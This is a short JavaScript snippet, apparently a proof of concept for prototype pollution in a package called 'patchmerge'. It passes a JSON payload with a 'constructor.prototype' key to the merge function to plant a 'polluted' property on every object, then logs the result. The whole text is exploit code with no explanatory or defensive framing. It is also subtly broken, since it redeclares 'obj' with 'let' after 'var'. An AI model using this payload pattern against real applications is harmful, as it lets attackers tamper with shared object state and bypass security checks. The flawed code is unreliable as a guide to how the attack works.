var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const patchMerge = require('patchmerge');
console.log({}.polluted);
let obj = {};
patchMerge(obj, JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);